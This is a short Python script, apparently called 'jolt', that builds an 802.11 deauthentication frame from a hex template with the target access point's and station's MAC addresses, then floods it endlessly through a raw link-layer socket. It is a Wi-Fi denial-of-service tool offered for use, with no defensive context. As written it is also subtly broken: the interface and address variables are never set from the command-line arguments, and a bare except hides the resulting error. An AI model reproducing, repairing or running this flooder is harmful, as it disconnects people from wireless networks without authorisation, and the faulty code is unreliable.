#!/usr/bin/env python3


'usage: jolt <if> <wap> <sta>'


from socket import *
from sys import argv


template = '00000d00048002000200010000c0003a01{0}{1}{0}706a0100'


def mac(string):
  return string.replace(':', str())


def construct(wap, sta):
    
  frame = bytes.fromhex(template.format(mac(wap), mac(sta)))
  return frame


def flood(iface, packet):
  # use a raw socket to transmit link layer.

  s = socket(AF_PACKET, SOCK_RAW, 0)
  s.bind((iface, 0))

  while 1: 
    s.send(packet)


def start():
  if len(argv) != 4:
    return print(__doc__)

  print('@ sending frames...')
    
  try:
    frame = construct(wap, sta)
    flood(iface, frame)

  except:
    return


start()
print('@ stopped.')
